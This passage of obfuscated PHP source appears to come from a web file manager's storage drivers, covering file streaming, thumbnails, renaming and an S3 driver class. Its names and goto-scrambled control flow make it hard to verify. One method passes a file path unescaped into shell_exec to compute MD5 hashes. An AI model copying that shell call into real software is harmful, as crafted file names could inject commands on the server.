e‡İõÇŠ¤Ò: $D¥›·‘–Ã£ = intval($e¼Ç‘ÜÆ¼ / $B¶™Èæ£ÜÁ); $FˆŠ©ÏÎìê = $EÇÕ×Ê¿ß„[43]; for ($EÜ³ÓïÙÎ† = 0; $EÜ³ÓïÙÎ† < $B¶™Èæ£ÜÁ; $EÜ³ÓïÙÎ†++) { $FˆŠ©ÏÎìê .= $this->fileSubstr($ešØÂ…°Œ™, $D¥›·‘–Ã£ * $EÜ³ÓïÙÎ†, $B…³›ø‚ÊÍ); } goto A×ÎÆÈéóå; eé…İÈö°è: $EÇÕ×Ê¿ß„ =& $_SERVER[£¶ä½¶¢]; if (!$ešØÂ…°Œ™) { return md5($EÇÕ×Ê¿ß„[43]); } $e¼Ç‘ÜÆ¼ = $this->size($ešØÂ…°Œ™); goto Cš™šƒ±ĞÉ; fƒ‘åôŞñ: } public static $md5Cache = array(); public function hashMd5($CáÉîâ¦£) { $CáÉîâ¦£ = $this->iconvSystem($CáÉîâ¦£); if (isset(self::$md5Cache[$CáÉîâ¦£])) { return self::$md5Cache[$CáÉîâ¦£]; } self::$md5Cache[$CáÉîâ¦£] = $this->hashMd5Shell($CáÉîâ¦£); if (!self::$md5Cache[$CáÉîâ¦£]) { self::$md5Cache[$CáÉîâ¦£] = @md5_file($CáÉîâ¦£); } return self::$md5Cache[$CáÉîâ¦£]; } private function hashMd5Shell($c¸®Øæ´•) { goto AŸ‰Ø˜‡µÕ; F««±”Ÿß: $CÔÏ†‘Ä“ = shell_exec($cÍÆÅÓ©çò . "\x20\x22{$c¸®Øæ´•}\x22"); $CÔÏ†‘Ä“ = str_replace($DÕèá°…ğ[114], $DÕèá°…ğ[43], $CÔÏ†‘Ä“); return substr($CÔÏ†‘Ä“, 0, 32); goto BÚñÓ›á” ; AŸ‰Ø˜‡µÕ: $DÕèá°…ğ =& $_SERVER[£¶ä½¶¢]; if (!function_exists($DÕèá°…ğ[108])) { return !1; } $B¼’œ‚ïì = array($DÕèá°…ğ[109], $DÕèá°…ğ[110]); goto Fğ½ÛöĞÉˆ; Fğ½ÛöĞÉˆ: $cÍÆÅÓ©çò = Cache::get($DÕèá°…ğ[111]); if (!$cÍÆÅÓ©çò) { $c›ÙãÁ½Ÿí = BASIC_PATH . $DÕèá°…ğ[112]; $aÖ ³·Ú‹Ö = md5_file($c›ÙãÁ½Ÿí); $cÍÆÅÓ©çò = $DÕèá°…ğ[113]; foreach ($B¼’œ‚ïì as $d„á‹·£§õ) { $CÔÏ†‘Ä“ = shell_exec($d„á‹·£§õ . "\40\42{$c›ÙãÁ½Ÿí}\42"); if ($CÔÏ†‘Ä“ && substr(trim($CÔÏ†‘Ä“), 0, 32) == $aÖ ³·Ú‹Ö) { $cÍÆÅÓ©çò = $d„á‹·£§õ; break; } } Cache::set($DÕèá°…ğ[111], $cÍÆÅÓ©çò, 3600); } if ($cÍÆÅÓ©çò == $DÕèá°…ğ[113]) { return !1; } goto F««±”Ÿß; BÚñÓ›á” : } public function link($d‰²Ü õÒ¼) { return $d‰²Ü õÒ¼; } public function fileOut($fåÅ×«Æ‡², $dÂÑÆÆ´ğ¡ = false, $cß–ÂÎ‰àÈ = false, $b‘Ãˆ’ñ÷ë = '') { goto A¯‡•…àÚŒ; EñÇÉ³•Í: $eĞƒéç…¢ = 0; $céˆàäîØ‘ = $BÏŞ¸¤¸š‰ - 1; $b•¡Ë÷İ = $this->ext($Bìî¿”³½Ú); goto FÇ¿Ñ©øĞã; Aé´Ä¯˜¸: $FñØ’„‰šË = strtolower($_SERVER[$Bôëé‰Æƒµ[152]]); if ($DÍèß¸¡’ && $FñØ’„‰šË && $a•ãò•£¨) { if (strstr($FñØ’„‰šË, $Bôëé‰Æƒµ[153])) { header($Bôëé‰Æƒµ[154] . $fåÅ×«Æ‡²); } else { if (strstr($FñØ’„‰šË, $Bôëé‰Æƒµ[155])) { header($Bôëé‰Æƒµ[156] . $fåÅ×«Æ‡²); } else { if (strstr($FñØ’„‰šË, $Bôëé‰Æƒµ[157])) { header($Bôëé‰Æƒµ[158] . $fåÅ×«Æ‡²); } } } if ($Aî‚ë°ğ÷) { header($Bôëé‰Æƒµ[159] . $Aî‚ë°ğ÷); } return; } if (isset($_SERVER[$Bôëé‰Æƒµ[160]])) { if (preg_match($Bôëé‰Æƒµ[161], $_SERVER[$Bôëé‰Æƒµ[160]], $eÆÕ˜×èàô)) { $eĞƒéç…¢ = intval($eÆÕ˜×èàô[1]); if (!empty($eÆÕ˜×èàô[2])) { $céˆàäîØ‘ = intval($eÆÕ˜×èàô[2]); } } header($Bôëé‰Æƒµ[162]); header("\103\157\156\x74\x65\156\164\55\122\141\x6e\x67\145\x3a\40\142\171\x74\x65\163\x20{$eĞƒéç…¢}\x2d{$céˆàäîØ‘}\x2f" . $BÏŞ¸¤¸š‰); } else { header($Bôëé‰Æƒµ[163]); } goto b‰Î·Ÿ°è; fÉÅïÁ‹äé: if ($Aî‚ë°ğ÷) { $bµÃµëøË = intval(1000 * 1000 * ($fÚ™àí–° / $Aî‚ë°ğ÷)); } while ($eĞƒéç…¢ <= $céˆàäîØ‘) { $eÓ¯³ãÎ‹¾ = timeFloat(); check_abort(); $D¯š½†¬å¦ = $céˆàäîØ‘ - $eĞƒéç…¢ + 1; if ($D¯š½†¬å¦ <= $fÚ™àí–°) { $fÚ™àí–° = $D¯š½†¬å¦; } echo $this->fileSubstr($fåÅ×«Æ‡², $eĞƒéç…¢, $fÚ™àí–°); $eĞƒéç…¢ += $fÚ™àí–°; if ($fÚ™àí–° == $D¯š½†¬å¦) { $eĞƒéç…¢ = $céˆàäîØ‘ + 1; } if ($bµÃµëøË) { $D–„‰ñÔÂÙ = intval(1000 * 1000 * (timeFloat() - $eÓ¯³ãÎ‹¾)); $dšˆÜÂÑîŒ = $bµÃµëøË - $D–„‰ñÔÂÙ; if ($dšˆÜÂÑîŒ > 5) { usleep($dšˆÜÂÑîŒ); } } } goto D¨‚Ôˆò¦š; a¤Ìâ²‹‰Ø: $DÍèß¸¡’ = $this->getType() == $Bôëé‰Æƒµ[116]; $a•ãò•£¨ = $GLOBALS[$Bôëé‰Æƒµ[16]][$Bôëé‰Æƒµ[98]][$Bôëé‰Æƒµ[117]][$Bôëé‰Æƒµ[118]]; $Aî‚ë°ğ÷ = (double) $GLOBALS[$Bôëé‰Æƒµ[16]][$Bôëé‰Æƒµ[98]][$Bôëé‰Æƒµ[117]][$Bôëé‰Æƒµ[119]] * 1024 * 1024; goto F„È´âÓìÒ; eÅ„‚ë½‚”: if (isset($_SERVER[$Bôëé‰Æƒµ[141]]) && strtotime($_SERVER[$Bôëé‰Æƒµ[141]]) == $cœôâÓšº[$Bôëé‰Æƒµ[94]]) { header($Bôëé‰Æƒµ[142], !0, 304); die; } if (isset($_SERVER[$Bôëé‰Æƒµ[143]]) && $_SERVER[$Bôëé‰Æƒµ[143]] == $b‘Ãˆ’ñ÷ë) { header($Bôëé‰Æƒµ[144] . $b‘Ãˆ’ñ÷ë, !0, 304); die; } header($Bôëé‰Æƒµ[144] . $b‘Ãˆ’ñ÷ë); goto b¼‡—íÒ; cİä˜âñ§º: $c•­¹ğ˜¥™ = $Bôëé‰Æƒµ[126] . $c•­¹ğ˜¥™ . $Bôëé‰Æƒµ[132] . $c•­¹ğ˜¥™; if ($dÂÑÆÆ´ğ¡) { header($Bôëé‰Æƒµ[133]); header($Bôëé‰Æƒµ[134] . $c•­¹ğ˜¥™); } else { header($Bôëé‰Æƒµ[135] . $c•­¹ğ˜¥™); } header($Bôëé‰Æƒµ[136] . gmdate($Bôëé‰Æƒµ[120], time() + 3600 * 24 * 30) . $Bôëé‰Æƒµ[137]); goto Aˆ¦ôßÖ¹; a¬ëê®Ù: $bÍ‰¬ß›åŸ = get_file_mime($b•¡Ë÷İ); if (strstr($bÍ‰¬ß›åŸ, $Bôëé‰Æƒµ[127])) { $bÍ‰¬ß›åŸ = $bÍ‰¬ß›åŸ . $Bôëé‰Æƒµ[128]; } if ($dÂÑÆÆ´ğ¡ === !1 && !mime_support($bÍ‰¬ß›åŸ)) { $dÂÑÆÆ´ğ¡ = !0; $bÍ‰¬ß›åŸ = $Bôëé‰Æƒµ[129]; } goto FÆÇ˜‡’éƒ; FÇ¿Ñ©øĞã: if (in_array($b•¡Ë÷İ, array($Bôëé‰Æƒµ[121], $Bôëé‰Æƒµ[122], $Bôëé‰Æƒµ[123], $Bôëé‰Æƒµ[124]))) { $b•¡Ë÷İ = $Bôëé‰Æƒµ[125]; } if (!$b‘Ãˆ’ñ÷ë) { $b‘Ãˆ’ñ÷ë = md5($FÉ‰ùì™™ . $this->hashSimple($fåÅ×«Æ‡²)); } $b‘Ãˆ’ñ÷ë = $Bôëé‰Æƒµ[126] . $b‘Ãˆ’ñ÷ë . $Bôëé‰Æƒµ[126]; goto a¬ëê®Ù; F·Œ½·®Ë: $BÏŞ¸¤¸š‰ = $cœôâÓšº[$Bôëé‰Æƒµ[88]]; $FÉ‰ùì™™ = gmdate($Bôëé‰Æƒµ[120], $cœôâÓšº[$Bôëé‰Æƒµ[94]]); $Bìî¿”³½Ú = $cß–ÂÎ‰àÈ ? $cß–ÂÎ‰àÈ : $this->iconvApp($cœôâÓšº[$Bôëé‰Æƒµ[38]]); goto EñÇÉ³•Í; C†„éâ•Œ‰: header($Bôëé‰Æƒµ[148] . $BÏŞ¸¤¸š‰); header($Bôëé‰Æƒµ[149]); if (!$dÂÑÆÆ´ğ¡ && $b•¡Ë÷İ == $Bôëé‰Æƒµ[150]) { if ($BÏŞ¸¤¸š‰ > 1024 * 1024 * 5) { die; } $D·†»àìÈ¢ = $this->getContent($fåÅ×«Æ‡²); $D·†»àìÈ¢ = Html::clearSVG($D·†»àìÈ¢); header($Bôëé‰Æƒµ[151] . strlen($D·†»àìÈ¢)); echo $D·†»àìÈ¢; die; } goto Aé´Ä¯˜¸; Aˆ¦ôßÖ¹: header($Bôëé‰Æƒµ[138]); header($Bôëé‰Æƒµ[139]); header($Bôëé‰Æƒµ[140]); goto eÅ„‚ë½‚”; b‰Î·Ÿ°è: $BŒÈÒÁ´ î = !0; if ($_SERVER[$Bôëé‰Æƒµ[164]] == $Bôëé‰Æƒµ[165] && $BÏŞ¸¤¸š‰ > 1204 * 1024 * 1024 * 2) { $BŒÈÒÁ´ î = !1; } if ($BŒÈÒÁ´ î) { header($Bôëé‰Æƒµ[166] . ($céˆàäîØ‘ - $eĞƒéç…¢ + 1)); } goto fëÀ·•ÂĞ; fëÀ·•ÂĞ: if ($_SERVER[$Bôëé‰Æƒµ[167]] == $Bôëé‰Æƒµ[168]) { return; } $fÚ™àí–° = 1024 * 100; $bµÃµëøË = 0; goto fÉÅïÁ‹äé; FÆÇ˜‡’éƒ: header($Bôëé‰Æƒµ[130]); header($Bôëé‰Æƒµ[131] . $bÍ‰¬ß›åŸ); $c•­¹ğ˜¥™ = rawurlencode($Bìî¿”³½Ú); goto cİä˜âñ§º; F„È´âÓìÒ: @ob_end_clean(); set_timeout(); $cœôâÓšº = $this->infoFull($fåÅ×«Æ‡²); goto F·Œ½·®Ë; A¯‡•…àÚŒ: $Bôëé‰Æƒµ =& $_SERVER[£¶ä½¶¢]; $this->cacheMethod(null, null); if (!$fåÅ×«Æ‡² || !$this->exist($fåÅ×«Æ‡²)) { show_json(LNG($Bôëé‰Æƒµ[115]), !1, $cß–ÂÎ‰àÈ); } goto a¤Ìâ²‹‰Ø; b¼‡—íÒ: header($Bôëé‰Æƒµ[145] . $FÉ‰ùì™™ . $Bôëé‰Æƒµ[137]); header($Bôëé‰Æƒµ[146] . $Bìî¿”³½Ú); header($Bôëé‰Æƒµ[147]); goto C†„éâ•Œ‰; D¨‚Ôˆò¦š: } public function fileOutServer($eøÛ½Ç¬“œ, $Cáî™ÊŞ“¶ = false, $dŸéè—Ã‹Ğ = false, $e‰µÇ‡İš‚ = '') { $this->fileOut($eøÛ½Ç¬“œ, $Cáî™ÊŞ“¶, $dŸéè—Ã‹Ğ, $e‰µÇ‡İš‚); } public function fileOutLink($DË¥¶î¨¨ò) { header($_SERVER[£¶ä½¶¢][169] . $DË¥¶î¨¨ò); die; } public function cacheMethod($a›Úïë”×Ï, $bªÃâ‡ô¾–, $a¿’ƒ„Ó…É = null) { goto AÓãâ’ëÃ; Aé„«ùƒ÷‚: $F»ù‡“„³… = $this->{$a›Úïë”×Ï}($bªÃâ‡ô¾–); $c®“öÖ°[$aª‡ÙôËÏ] = $F»ù‡“„³…; return $F»ù‡“„³…; goto EåÑ¼‡Ú; AÓãâ’ëÃ: $C–×é¾ä‹ =& $_SERVER[£¶ä½¶¢]; static $c®“öÖ° = array(); $EŸÈí“‹Òç = $bªÃâ‡ô¾– ? ltrim($this->getPathOuter($bªÃâ‡ô¾–), $C–×é¾ä‹[18]) : $bªÃâ‡ô¾–; goto FÌœ•°ëœ; bõÖÙ·©¿¹: if (!is_null($a¿’ƒ„Ó…É)) { $c®“öÖ°[$aª‡ÙôËÏ] = $a¿’ƒ„Ó…É; return; } $F»ù‡“„³… = isset($c®“öÖ°[$aª‡ÙôËÏ]) ? $c®“öÖ°[$aª‡ÙôËÏ] : null; if (!is_null($F»ù‡“„³…)) { return $F»ù‡“„³…; } goto Aé„«ùƒ÷‚; FÌœ•°ëœ: $aª‡ÙôËÏ = $C–×é¾ä‹[170] . $a›Úïë”×Ï . $C–×é¾ä‹[171] . rtrim($EŸÈí“‹Òç, $C–×é¾ä‹[18]); if (is_null($a›Úïë”×Ï)) { $c®“öÖ° = array(); return; } if (is_null($bªÃâ‡ô¾–)) { unset($c®“öÖ°[$aª‡ÙôËÏ]); return; } goto bõÖÙ·©¿¹; EåÑ¼‡Ú: } public function fileOutImage($E‹˜Ìµ¿Äº, $aÖóØ…µâ = 250) { goto dÙ‹•ë–¬; e½ƒ—¥µŒ: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $FÂÀæå°£† = DATA_THUMB . $fœï†™µƒî; del_file($FÂÀæå°£†); goto BÕï‹Ôºí¾; Cˆ˜‘à¹­: $fœï†™µƒî = "{$dÙ¾ËğÄ©ß}\x5f{$aÖóØ…µâ}\56\160\x6e\147"; if (!($bÇ–‘óÕ“ï = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Då…Ÿé’£[182]))) { $b£‡×óÍ¸ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Då…Ÿé’£[183]); } else { $b£‡×óÍ¸ = KodIO::make($bÇ–‘óÕ“ï); } if ($bÇ–‘óÕ“ï = IO::fileNameExist($b£‡×óÍ¸, $fœï†™µƒî)) { $FÂÀæå°£† = KodIO::make($bÇ–‘óÕ“ï); return IO::fileOut($FÂÀæå°£†, !1, $aŸĞ‡¹¥öË); } goto e½ƒ—¥µŒ; FÍéÉ÷¸É: if (isset($GLOBALS[$Då…Ÿé’£[172]]) && $GLOBALS[$Då…Ÿé’£[172]][$Då…Ÿé’£[86]] == $cà‘áÜµŒä[$Då…Ÿé’£[86]]) { $cÇ“¼õªå— = $GLOBALS[$Då…Ÿé’£[172]][$Då…Ÿé’£[173]]; if (!$cà‘áÜµŒä[$Då…Ÿé’£[174]]) { $cà‘áÜµŒä[$Då…Ÿé’£[174]] = $GLOBALS[$Då…Ÿé’£[172]]; } if (isset($cÇ“¼õªå—[$Då…Ÿé’£[175]])) { if ($cÇ“¼õªå—[$Då…Ÿé’£[175]] <= $aÖóØ…µâ && $cÇ“¼õªå—[$Då…Ÿé’£[176]] <= $aÖóØ…µâ) { $e¤³ ŒÈÍÈ = !0; } } $aŸĞ‡¹¥öË = $cà‘áÜµŒä[$Då…Ÿé’£[174]][$Då…Ÿé’£[38]]; } if ($cà‘áÜµŒä[$Då…Ÿé’£[88]] <= 1024 * 50 || $e¤³ ŒÈÍÈ || !function_exists($Då…Ÿé’£[177]) || $cà‘áÜµŒä[$Då…Ÿé’£[178]] == $Då…Ÿé’£[179]) { return $this->fileOut($E‹˜Ìµ¿Äº, !1, $aŸĞ‡¹¥öË); } if (isset($cà‘áÜµŒä[$Då…Ÿé’£[174]][$Då…Ÿé’£[180]])) { $dÙ¾ËğÄ©ß = $cà‘áÜµŒä[$Då…Ÿé’£[174]][$Då…Ÿé’£[180]]; } else { if (isset($cà‘áÜµŒä[$Då…Ÿé’£[174]][$Då…Ÿé’£[181]])) { $dÙ¾ËğÄ©ß = $cà‘áÜµŒä[$Då…Ÿé’£[174]][$Då…Ÿé’£[181]]; } else { $dÙ¾ËğÄ©ß = md5("{$cà‘áÜµŒä[$Då…Ÿé’£[38]]}\x5f{$cà‘áÜµŒä[$Då…Ÿé’£[86]]}\x5f{$cà‘áÜµŒä[$Då…Ÿé’£[88]]}"); } } goto Cˆ˜‘à¹­; Bµ¡é‰ˆ: $cà‘áÜµŒä = $this->info($E‹˜Ìµ¿Äº); $aŸĞ‡¹¥öË = $cà‘áÜµŒä[$Då…Ÿé’£[38]]; $e¤³ ŒÈÍÈ = !1; goto FÍéÉ÷¸É; BÕï‹Ôºí¾: if (!@file_exists($FÂÀæå°£†)) { $aÌœŸì÷Íõ = TEMP_FILES; if (!is_dir($aÌœŸì÷Íõ)) { mk_dir($aÌœŸì÷Íõ); } $c‹‹é• ´ç = $aÌœŸì÷Íõ . $dÙ¾ËğÄ©ß . $Då…Ÿé’£[105] . $cà‘áÜµŒä[$Då…Ÿé’£[178]]; if (!@file_exists($c‹‹é• ´ç)) { $c‹‹é• ´ç = $this->download($E‹˜Ìµ¿Äº, $c‹‹é• ´ç); } ImageThumb::createThumb($c‹‹é• ´ç, $FÂÀæå°£†, $aÖóØ…µâ, $aÖóØ…µâ * 10); } if (!file_exists($FÂÀæå°£†) || filesize($FÂÀæå°£†) < 100) { return @file_exists($c‹‹é• ´ç) ? IO::fileOut($c‹‹é• ´ç) : $this->fileOut($E‹˜Ìµ¿Äº); } if (!($e§¿‰½Ä Ù = IO::move($FÂÀæå°£†, $b£‡×óÍ¸))) { return IO::fileOut($FÂÀæå°£†); } goto EÒª¦öããÛ; dÙ‹•ë–¬: $Då…Ÿé’£ =& $_SERVER[£¶ä½¶¢]; set_timeout(); if (substr($E‹˜Ìµ¿Äº, 0, 4) == $Då…Ÿé’£[157]) { $this->fileOutLink($E‹˜Ìµ¿Äº); } goto Bµ¡é‰ˆ; EÒª¦öããÛ: del_file($FÂÀæå°£†); IO::fileOut($e§¿‰½Ä Ù); goto B®Ö‚•­´; B®Ö‚•­´: } public function fileOutImageServer($cÖ½œ ñŒë, $aÅÂçä±Õµ = 250) { $this->fileOutImage($cÖ½œ ñŒë, $aÅÂçä±Õµ); } public function fileNameAuto($aóÅñ”‡âñ, $D¥Ø¸œÜÅ, $e¥¥¸²¯­Ô = REPEAT_RENAME, $CÁîœêˆÏ = false) { goto DÚİ¨öìÎÕ; D÷Áœ£¾Œ¤: while ($this->exist(rtrim($aóÅñ”‡âñ, $CÜ†‘Ã‚È[18]) . $CÜ†‘Ã‚È[18] . $BÛåïöÉ¥Æ)) { $BÛåïöÉ¥Æ = $Fª’Í¶Äø‰ . "\x28{$AŠùé¢…‹Ì}\x29{$C±ÃÛîè‰}"; $AŠùé¢…‹Ì++; } return $BÛåïöÉ¥Æ; goto fİ˜„öŸÕø; e¦î»­ÑŸ: if ($e¥¥¸²¯­Ô == REPEAT_SKIP) { return !1; } $C±ÃÛîè‰ = $CÜ†‘Ã‚È[105] . get_path_ext($D¥Ø¸œÜÅ); $C±ÃÛîè‰ = $C±ÃÛîè‰ == $CÜ†‘Ã‚È[105] || $CÁîœêˆÏ ? $CÜ†‘Ã‚È[43] : $C±ÃÛîè‰; goto CŠ˜°‰ÒÌ; DÚİ¨öìÎÕ: $CÜ†‘Ã‚È =& $_SERVER[£¶ä½¶¢]; $CÃ¿—å‹È = $aóÅñ”‡âñ === $CÜ†‘Ã‚È[43] ? $D¥Ø¸œÜÅ : rtrim($aóÅñ”‡âñ, $CÜ†‘Ã‚È[18]) . $CÜ†‘Ã‚È[18] . $D¥Ø¸œÜÅ; if ($e¥¥¸²¯­Ô == REPEAT_REPLACE || !$this->exist($CÃ¿—å‹È) || $CÁîœêˆÏ && $e¥¥¸²¯­Ô != REPEAT_RENAME_FOLDER) { return $D¥Ø¸œÜÅ; } goto e¦î»­ÑŸ; CŠ˜°‰ÒÌ: $AŠùé¢…‹Ì = 1; $Fª’Í¶Äø‰ = substr($D¥Ø¸œÜÅ, 0, strlen($D¥Ø¸œÜÅ) - strlen($C±ÃÛîè‰)); $BÛåïöÉ¥Æ = $Fª’Í¶Äø‰ . "\50{$AŠùé¢…‹Ì}\x29{$C±ÃÛîè‰}"; goto D÷Áœ£¾Œ¤; fİ˜„öŸÕø: } private function fileNameAutoList($EÍé´¼Ø, $a’ŒïÈ‹¨, $Bç¾ñÎæ‡ô = false) { goto E™ß¸ùËƒ; aÚÓä“…”: $CŒÜÌ˜ùŠ = substr($a’ŒïÈ‹¨, 0, strlen($a’ŒïÈ‹¨) - strlen($d›ò•À£Óê)); $d˜»Ó÷” = $CŒÜÌ˜ùŠ . "\50\x30\x29{$d›ò•À£Óê}"; for ($f¥©æç¯›á = 1; $f¥©æç¯›á <= count($CïÜƒ¹ÊìÃ) + 1; $f¥©æç¯›á++) { $d˜»Ó÷” = $CŒÜÌ˜ùŠ . "\x28{$f¥©æç¯›á}\x29{$d›ò•À£Óê}"; if (!in_array_not_case($d˜»Ó÷”, $CïÜƒ¹ÊìÃ)) { return $d˜»Ó÷”; } } goto d‘öÕ«àëù; d‘öÕ«àëù: return $d˜»Ó÷”; goto fÍ‹°Š±…ë; AÁ‘œÅ§¿Ö: $CïÜƒ¹ÊìÃ = array_to_keyvalue($bè™Úà‰ƒ®, $b°ŠÊ¢±íç[43], $b°ŠÊ¢±íç[38]); $d›ò•À£Óê = $b°ŠÊ¢±íç[105] . get_path_ext($a’ŒïÈ‹¨); $d›ò•À£Óê = $d›ò•À£Óê == $b°ŠÊ¢±íç[105] || $Bç¾ñÎæ‡ô ? $b°ŠÊ¢±íç[43] : $d›ò•À£Óê; goto aÚÓä“…”; E™ß¸ùËƒ: $b°ŠÊ¢±íç =& $_SERVER[£¶ä½¶¢]; $bè™Úà‰ƒ® = $this->listPath($EÍé´¼Ø, !0); $bè™Úà‰ƒ® = array_merge($bè™Úà‰ƒ®[$b°ŠÊ¢±íç[85]], $bè™Úà‰ƒ®[$b°ŠÊ¢±íç[84]]); goto AÁ‘œÅ§¿Ö; fÍ‹°Š±…ë: } public function listAllFiles($B®ãöˆéá, $E¯“„Ò‘Ÿà, $f¤±Ğ›ª¦š = array()) { goto EÑˆ˜¹Ä£à; dŒÃ°Š”ç´: $B®ãöˆéá = trim($B®ãöˆéá, $d­Ö‹””¹[18]); foreach ($E¯“„Ò‘Ÿà as $aÖ¡´äÄ‰õ) { $c÷£ØÚëÃ = ltrim(substr(trim($aÖ¡´äÄ‰õ, $d­Ö‹””¹[18]), strlen($B®ãöˆéá)), $d­Ö‹””¹[18]); $CˆÂˆ»Î¯ = array_merge($CˆÂˆ»Î¯, $this->slicePath($c÷£ØÚëÃ)); } $A§ëÃˆÇá¡ = array(); goto fÀâğİÁ¨; fÀâğİÁ¨: foreach (array_unique($CˆÂˆ»Î¯) as $aÖ¡´äÄ‰õ) { $aÆ—Ñ³¦µË = array($d­Ö‹””¹[86] => $this->getPathOuter($d­Ö‹””¹[18] . $B®ãöˆéá . $d­Ö‹””¹[18] . $aÖ¡´äÄ‰õ), $d­Ö‹””¹[87] => 1, $d­Ö‹””¹[88] => 0); if (substr($aÖ¡´äÄ‰õ, -1) != $d­Ö‹””¹[18]) { $aÆ—Ñ³¦µË[$d­Ö‹””¹[87]] = 0; $a•®ù‰±é¹ = $this->getPath($B®ãöˆéá . $d­Ö‹””¹[18] . $aÖ¡´äÄ‰õ); $aÆ—Ñ³¦µË[$d­Ö‹””¹[88]] = isset($f¤±Ğ›ª¦š[$a•®ù‰±é¹]) ? $f¤±Ğ›ª¦š[$a•®ù‰±é¹] : $this->size($a•®ù‰±é¹); } $A§ëÃˆÇá¡[] = $aÆ—Ñ³¦µË; } return $A§ëÃˆÇá¡; goto Fô±ÉíÈµí; EÑˆ˜¹Ä£à: $d­Ö‹””¹ =& $_SERVER[£¶ä½¶¢]; if (empty($E¯“„Ò‘Ÿà)) { return array(); } $CˆÂˆ»Î¯ = array(); goto dŒÃ°Š”ç´; Fô±ÉíÈµí: } public function slicePath($dŠ†ï³øî) { $D»ÏÍ×Ğè– =& $_SERVER[£¶ä½¶¢]; $e¿‚¸ÌĞªÕ = explode($D»ÏÍ×Ğè–[18], trim($dŠ†ï³øî, $D»ÏÍ×Ğè–[18])); $c«ÙÍ„æœ = 0; do { ++$c«ÙÍ„æœ; $B¸ƒ‘¥”‘[] = implode($D»ÏÍ×Ğè–[18], array_slice($e¿‚¸ÌĞªÕ, 0, $c«ÙÍ„æœ)) . $D»ÏÍ×Ğè–[18]; } while ($c«ÙÍ„æœ < count($e¿‚¸ÌĞªÕ)); $B¸ƒ‘¥”‘[count($e¿‚¸ÌĞªÕ) - 1] = $dŠ†ï³øî; return $B¸ƒ‘¥”‘; } public function getHost() { $CĞÙì‹ñØã =& $_SERVER[£¶ä½¶¢]; $cí¦ñ‹’ = parse_url(trim($this->domain, $CĞÙì‹ñØã[18])); $AÌçœ‘¯õŠ = isset($cí¦ñ‹’[$CĞÙì‹ñØã[184]]) ? $cí¦ñ‹’[$CĞÙì‹ñØã[184]] : http_type(); $AÕŸµìœãç = isset($cí¦ñ‹’[$CĞÙì‹ñØã[185]]) ? $cí¦ñ‹’[$CĞÙì‹ñØã[185]] : $cí¦ñ‹’[$CĞÙì‹ñØã[86]]; if (isset($cí¦ñ‹’[$CĞÙì‹ñØã[186]])) { $AÕŸµìœãç .= $CĞÙì‹ñØã[14] . $cí¦ñ‹’[$CĞÙì‹ñØã[186]]; } return $AÌçœ‘¯õŠ . $CĞÙì‹ñØã[187] . $AÕŸµìœãç; } public function pathEncode($a ¡áÜÆ) { $d¶åó¾´î =& $_SERVER[£¶ä½¶¢]; return str_replace($d¶åó¾´î[188], $d¶åó¾´î[18], rawurlencode($a ¡áÜÆ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($dšíêìñïŒ) { set_timeout(); require_once SDK_DIR . $_SERVER[£¶ä½¶¢][189]; parent::__construct(); $this->_init($dšíêìñïŒ); } public function _init($fµ…“ˆØíÖ) { foreach ($fµ…“ˆØíÖ as $fÎô†½™ƒà => $Fˆ’î›°î‘) { if (isset($this->{$fÎô†½™ƒà})) { $this->{$fÎô†½™ƒà} = $Fˆ’î›°î‘; } } $this->endpoint = $fµ…“ˆØíÖ[$_SERVER[£¶ä½¶¢][190]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($c­îÛĞŠ = "\x76\x34") { $this->signVer = $c­îÛĞŠ; $this->client->setSignatureVersion($c­îÛĞŠ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto fÀ·¤ Ì®; eæá–Ù¼¥Æ: if ($d¿ğÏ³«µá[$bÜçùĞî[191]] != $bÜçùĞî[192] || $d¿ğÏ³«µá[$bÜçùĞî[193]] != $bÜçùĞî[192]) { return !1; } $D³ÓÅ‹Âëº = array_map($bÜçùĞî[194], $d¿ğÏ³«µá[$bÜçùĞî[195]]); if (!is_array($D³ÓÅ‹Âëº)) { $D³ÓÅ‹Âëº = array(); } goto cŸ…¸Ó¸¦; cŸ…¸Ó¸¦: $C“¹œáŒÉÃ = array($bÜçùĞî[196], $bÜçùĞî[197], $bÜçùĞî[198], $bÜçùĞî[199], $bÜçùĞî[200]); $e…‹ëÎœÓõ = array_diff($C“¹œáŒÉÃ, $D³ÓÅ‹Âëº); return empty($e…‹ëÎœÓõ); goto aëìã»àÁŠ; fÀ·¤ Ì®: $bÜçùĞî =& $_SERVER[£¶ä½¶¢]; $d¿ğÏ³«µá = $this->getBucketCors(); if (!$d¿ğÏ³«µá || !is_array($d¿ğÏ³«µá)) { return !1; } goto eæá–Ù¼¥Æ; aëìã»àÁŠ: } public function mkfile($d§½ÀÆæÂ, $fÌ‡‰²×é¯ = '', $BØ£­”» = REPEAT_RENAME) { $A…¸Â˜ÂË‹ = $this->setContent($d§½ÀÆæÂ, $fÌ‡‰²×é¯); if ($A…¸Â˜ÂË‹ !== !1) { return $this->getPathOuter($d§½ÀÆæÂ); } return !1; } public function mkdir($F„ £İö½, $F„Ğõ„ÓØ = REPEAT_SKIP) { $F”ğ“„ÌÈ¨ =& $_SERVER[£¶ä½¶¢]; if (empty($F„ £İö½) && $F„ £İö½ !== $F”ğ“„ÌÈ¨[201]) { return !1; } if ($this->_isFolder($F„ £İö½)) { return $this->getPathOuter($F„ £İö½); } $cˆ÷æ¸—Ğ” = $this->setContent($F„ £İö½, $F”ğ“„ÌÈ¨[43], !0); if ($cˆ÷æ¸—Ğ” !== !1) { return $this->getPathOuter($F„ £İö½); } return !1; } public function copyFile($a—¦ğÕäĞî, $c¾¼äŒË¦, $EÖä„°°ø = array()) { $eÑùâø†® =& $_SERVER[£¶ä½¶¢]; $C‘Ÿ‰¶ß£° = $this->objectMeta($a—¦ğÕäĞî); if (!$C‘Ÿ‰¶ß£°) { return !1; } if ($C‘Ÿ‰¶ß£°[$eÑùâø†®[88]] <= 1024 * 1024 * 200) { 